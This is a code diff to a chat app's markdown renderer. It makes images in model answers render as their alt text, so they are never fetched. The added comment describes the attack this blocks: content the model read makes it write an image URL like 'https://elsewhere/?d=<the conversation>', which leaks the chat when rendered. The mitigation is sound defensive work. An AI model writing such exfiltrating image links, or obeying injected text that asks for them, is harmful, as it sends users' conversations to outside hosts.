@@ -291,10 +291,20 @@ function copy(text: string): void {
  * here: a model's output is untrusted text, and a plugin that rendered raw HTML
  * would make every answer a place to put a script tag.
  */
+/*
+ * AN IMAGE IN AN ANSWER IS NEVER FETCHED. Its address is the model's to write,
+ * and a page or file the model read can make it `https://elsewhere/?d=<the
+ * conversation>`: the browser would send that the moment the answer rendered.
+ * Its words stay; the CSP's img-src refuses other hosts as well.
+ */
+function ImageAsWords({ alt }: { alt?: string }) {
+  return <>{alt ?? ""}</>;
+}
+
 function Prose({ text }: { text: string }) {
   return (
     <div className="[&_a]:text-foreground [&_a]:underline [&_code]:rounded [&_code]:bg-secondary [&_code]:px-1 [&_code]:py-0.5 [&_code]:font-mono [&_code]:text-[13px] [&_h1]:mt-5 [&_h1]:text-base [&_h1]:font-semibold [&_h2]:mt-5 [&_h2]:text-sm [&_h2]:font-semibold [&_h3]:mt-4 [&_h3]:text-sm [&_h3]:font-medium [&_li]:mt-1 [&_ol]:mt-2 [&_ol]:list-decimal [&_ol]:pl-5 [&_p]:mt-3 [&_p:first-child]:mt-0 [&_pre]:ocade-scroll [&_pre]:overflow-x-auto [&_pre]:rounded-md [&_pre]:bg-secondary [&_pre]:p-3 [&_table]:mt-3 [&_table]:w-full [&_table]:border-collapse [&_table]:text-[13px] [&_td]:border [&_td]:border-border/60 [&_td]:px-2 [&_td]:py-1 [&_th]:border [&_th]:border-border/60 [&_th]:px-2 [&_th]:py-1 [&_th]:text-left [&_th]:font-medium [&_ul]:mt-2 [&_ul]:list-disc [&_ul]:pl-5">
-      <Markdown components={{ pre: CodeBlock }}>{text}</Markdown>
+      <Markdown components={{ pre: CodeBlock, img: ImageAsWords }}>{text}</Markdown>
     </div>
   );
 }
